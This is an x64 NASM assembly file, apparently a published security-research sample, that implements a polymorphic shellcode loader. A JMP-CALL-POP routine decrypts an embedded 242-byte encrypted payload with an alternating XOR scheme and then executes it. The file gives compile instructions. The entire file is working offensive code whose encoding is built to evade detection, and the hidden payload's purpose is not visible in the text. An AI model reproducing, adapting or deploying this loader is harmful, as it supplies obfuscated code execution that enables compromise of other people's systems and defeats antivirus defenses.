; Polymorphic Shellcode 2
; Author: psycore8
; Website: https://www.nosociety.de
; Decrypts Shellcode with the following rules:
; EncryptedByte(even) = Byte(even) xor Key(XOR)
; EncryptedByte(odd)  = Byte(odd)  xor EncryptedByte(even)
; compile: nasm -f win64 poly2.asm -o poly2.o

section .data

section .text
    global _start

_start:
    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    mov cl, 242              ; length of embedded shellcode
    jmp short call_decoder   ; JMP-CALL-POP: 1. JMP

decoder:
	pop rsi               ; JMP-CALL-POP: 3. POP

decode_loop:
    test rcx, rcx            ; are we ready?
    jz Shellcode             ; jump, if finished

    ; even byte (Index % 2 == 0)
    mov rdx, rsi
    sub dl, Shellcode        ; calculate Index (rsi - Shellcode)
    test dl, 1               ; check: Index & 1 (odd or even?)
    jnz odd_byte             ; jump, if odd

    ; processing for even bytes
    mov al, [rsi]            ; save actual encrypted byte for the next loop
    xor byte [rsi], 0x20     ; decrypt byte in shellcode: byte xor key
    jmp post_processing

odd_byte:
	; processing for odd bytes
    xor byte [rsi], al       ; decrypt: encoded_byte XOR previous_encoded_byte

post_processing:
    inc rsi                  ; next encrypted byte
    dec rcx                  ; decrease length
    jmp decode_loop          ; back to the loop

call_decoder:
	call decoder         ; JMP-CALL-POP: 2. CALL
	Shellcode: db 0x75,0x3d,0xa9,0x4c,0x68,0xeb,0xcc,0x8c,0x68,0x59,0xe0,0xa8,0xa9,0xec,0xd8,0x90,0xa9,0xec,0xd0,0x98,0xa9,0xec,0xc8,0x80,0xa9,0xec,0xc0,0x88,0xa9,0xec,0xf8,0xb0,0xa9,0xec,0xf0,0xb8,0xa9,0xec,0xe8,0xb8,0x68,0xd0,0x77,0x1e,0x4e,0x0b,0x58,0x3d,0x43,0x52,0x68,0xa9,0xc0,0xc8,0x68,0xa9,0xc8,0xc0,0x70,0x38,0xa9,0xcc,0xf8,0xb0,0x11,0xd1,0x45,0x0d,0xab,0xeb,0x40,0x08,0xab,0xeb,0x38,0x70,0xab,0xeb,0x00,0x48,0xab,0xb3,0x68,0xe3,0x23,0x6b,0xab,0xeb,0x00,0x48,0xa9,0x6a,0x68,0x59,0xe9,0x62,0x63,0x5f,0x68,0x69,0xf8,0xb0,0x11,0xd8,0xa0,0x61,0xa8,0x23,0x24,0x2c,0x68,0x69,0xf8,0x73,0x68,0x7c,0x68,0xe1,0x6d,0x95,0xab,0xe3,0x3c,0x74,0x21,0xf8,0x68,0xe1,0x6d,0x9d,0xab,0xe3,0x00,0x48,0x21,0xf8,0x68,0xe1,0x6d,0x85,0xab,0xe3,0x04,0x4c,0x21,0xf8,0x68,0xe1,0x6d,0x8d,0x68,0x59,0xe0,0xa8,0x11,0xd8,0x68,0xe3,0x55,0x8d,0x68,0xe3,0x5d,0xb5,0xdc,0x57,0x1c,0x9b,0x68,0x69,0xff,0x4e,0x28,0xdb,0x86,0xf2,0x29,0x61,0xdf,0x1f,0x68,0x53,0x65,0x9d,0x55,0xb7,0x68,0xe3,0x6d,0x8d,0x68,0xe3,0x75,0x85,0x46,0xcd,0x24,0x65,0xab,0xaf,0xa2,0xea,0x21,0xf9,0x68,0x59,0xf2,0xba,0x11,0xd8,0x71,0x39,0x99,0xfa,0x41,0x2d,0x43,0x6d,0x45,0x3d,0x45,0x14,0x68,0xe1,0xc1,0x73,0x21,0x69,0xa3,0x47,0xd0,0x98,0xa3,0x4f,0x00,0xff,0xf0,0xb8,0xa3,0x67,0x18,0x50,0xa3,0x67,0x38,0x70,0xa3,0x67,0x28,0x75
